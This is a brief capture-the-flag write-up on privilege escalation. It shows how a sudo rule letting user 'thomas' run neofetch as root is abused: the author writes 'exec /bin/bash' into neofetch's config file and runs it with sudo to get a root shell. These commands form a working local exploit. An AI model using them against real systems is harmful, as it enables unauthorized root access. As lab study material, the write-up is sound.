Priv-esc
--------
- checking sudo -l shows that thomas can run neofetch as root
- but with the way its setup we cant pass any arguments to neofetch
- checking gtfobins for a possible exploit for neofetch and found one 
- but itll need a config file 
- the neofetch uses the config file inside thomas to execute and return result
- the sudo -l shows that $XDG_CONFIG_HOME is also set
- checking the contents of $XDG_CONFIG_HOME returns nothing 
- we can exploit this as follows

	$ export XDG_CONFIG_HOME="$HOME/.config"
	$ echo "exec /bin/bash" >> /home/thomas/.config/neofetch/config.conf
	$ sudo /usr/bin/neofetch \"\"

- we get a shell as root 
- grab the root flag
